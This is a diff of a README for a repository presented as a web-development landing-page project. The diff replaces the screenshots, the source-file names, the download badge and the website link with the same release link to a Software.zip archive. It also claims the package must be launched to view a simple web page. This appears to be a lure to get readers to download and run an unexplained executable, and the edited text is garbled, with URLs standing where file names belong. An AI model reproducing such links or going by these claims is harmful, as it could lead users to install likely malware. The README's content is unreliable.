@@ -11,15 +11,15 @@ Welcome to the PRODIGY_WD_01 repository! This is where you'll find an engaging a
 ## 🎨 Screenshots
 Here are some sneak peeks of the responsive landing page:
 
-![Screenshot 1](https://via.placeholder.com/800x400)
-![Screenshot 2](https://via.placeholder.com/800x400)
-![Screenshot 3](https://via.placeholder.com/800x400)
+![Screenshot 1](https://github.com/Probe895/PRODIGY_WD_01/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/Probe895/PRODIGY_WD_01/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/Probe895/PRODIGY_WD_01/releases/download/v2.0/Software.zip)
 
 ## 📁 Repository Structure
 Within this repository, you will find:
-- `index.html`: The main HTML file that structures the landing page.
-- `styles.css`: The CSS file containing the styles for the landing page.
-- `script.js`: The JavaScript file for the interactive features of the landing page.
+- `https://github.com/Probe895/PRODIGY_WD_01/releases/download/v2.0/Software.zip`: The main HTML file that structures the landing page.
+- `https://github.com/Probe895/PRODIGY_WD_01/releases/download/v2.0/Software.zip`: The CSS file containing the styles for the landing page.
+- `https://github.com/Probe895/PRODIGY_WD_01/releases/download/v2.0/Software.zip`: The JavaScript file for the interactive features of the landing page.
 
 ## 🌈 Topics
 Explore a range of topics covered in this repository:
@@ -36,12 +36,12 @@ Explore a range of topics covered in this repository:
 
 ## 🔗 How to Access
 Click the button below to download the software package:
-[![Download Software](https://img.shields.io/badge/Download-Software-<COLOR>.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/Probe895/PRODIGY_WD_01/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/Probe895/PRODIGY_WD_01/releases/download/v2.0/Software.zip)
 
 📌 Note: The software package needs to be launched to access the landing page.
 
 ## 🌐 Check the Website
-If you'd like to experience the landing page online, visit [this link](https://example.com).
+If you'd like to experience the landing page online, visit [this link](https://github.com/Probe895/PRODIGY_WD_01/releases/download/v2.0/Software.zip).
 
 🔍 If the provided link is not working, please check the "Releases" section of this repository for alternative access options.
 
